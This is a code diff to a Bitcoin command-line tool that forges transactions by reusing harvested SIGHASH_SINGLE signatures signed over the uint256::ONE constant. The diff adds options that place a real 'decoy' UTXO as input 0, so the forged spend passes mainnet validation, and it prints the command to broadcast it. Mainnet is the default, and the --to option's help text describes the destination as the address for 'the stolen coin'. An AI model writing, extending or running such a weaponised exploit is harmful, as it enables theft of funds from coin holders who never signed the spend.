@@ -243,8 +243,10 @@ def build_parser() -> argparse.ArgumentParser:
         description=(
             'Harvest SIGHASH_SINGLE signatures that were signed over the '
             'uint256::ONE constant from an existing transaction, then reuse them '
-            'to spend the same coin to any address you choose. Offline: prints a '
-            'signed transaction, never broadcasts it.'
+            'to spend the same coin to any address you choose. Prints a signed '
+            'transaction and never broadcasts it. Runs on mainnet by default; '
+            'add --decoy-txid/--decoy-vout/--decoy-value/--decoy-key with a UTXO '
+            'of your own so every input is real and the result is broadcastable.'
         ),
     )
     forge.add_argument(
@@ -258,6 +260,22 @@ def build_parser() -> argparse.ArgumentParser:
     forge.add_argument('--value', type=int, required=True, help='value of that output, sats')
     forge.add_argument('--to', required=True, help='address to send the stolen coin to')
     forge.add_argument('--fee', type=int, default=1000, help='fee in satoshis (default 1000)')
+
+    # A mainnet node validates every input, so a decoy input needs a real
+    # prevout. Without these the forged tx is an offline demonstration only.
+    forge.add_argument(
+        '--decoy-txid',
+        help='txid of a real UTXO to use as input 0 (required to broadcast)',
+    )
+    forge.add_argument('--decoy-vout', type=int, default=0)
+    forge.add_argument(
+        '--decoy-key',
+        help='private key (hex or WIF) for that UTXO, used to sign the decoy input',
+    )
+    forge.add_argument(
+        '--decoy-value', type=int, default=0, help='value of the decoy UTXO, sats'
+    )
+
     forge.add_argument('--network', default='mainnet', choices=sorted(_CHAINS))
     forge.add_argument('--json', action='store_true')
 
@@ -768,6 +786,22 @@ def _forge_replay(args) -> int:
                     'found in that transaction; there is nothing to replay'
                 )
             )
+        decoy_script = None
+        decoy_key = None
+        if args.decoy_txid:
+            if not args.decoy_key:
+                return _fail(
+                    ValueError(
+                        '--decoy-txid needs --decoy-key: a mainnet node validates '
+                        'every input, so the decoy must be signed'
+                    )
+                )
+            decoy_key = resolve_private_key(None, args.decoy_key)
+            decoy_script = key_info(decoy_key, args.network)[0]
+            decoy_script = address_to_script(decoy_script, args.network)
+        elif args.decoy_key:
+            return _fail(ValueError('--decoy-key needs --decoy-txid'))
+
         forged = forge_from_harvest(
             harvests,
             prev_txid=args.txid,
@@ -776,6 +810,11 @@ def _forge_replay(args) -> int:
             value=args.value,
             network=args.network,
             fee=args.fee,
+            decoy_txid=args.decoy_txid,
+            decoy_vout=args.decoy_vout,
+            decoy_script=decoy_script,
+            decoy_value=args.decoy_value,
+            decoy_key=decoy_key,
         )
     except ValueError as exc:
         return _fail(exc)
@@ -804,6 +843,19 @@ def _forge_replay(args) -> int:
     print()
     print('This transaction spends the coin without any key holder having signed')
     print('it. It is printed, not broadcast.')
+    if args.decoy_txid:
+        print()
+        print('Input 0 spends your decoy UTXO, so every input is real and this')
+        print('transaction is broadcastable:')
+        print('  python -m faketoshi broadcast --network %s <hex above>' % args.network)
+    else:
+        print()
+        print('Input 0 is a synthetic outpoint, so this is an offline')
+        print('demonstration: a node would reject it with')
+        print('bad-txns-inputs-missingorspent. To make it broadcastable, add a')
+        print('real UTXO as input 0:')
+        print('  --decoy-txid <txid> --decoy-vout <n> --decoy-value <sats> \\')
+        print('  --decoy-key <your key for it>')
     return 0
 
 
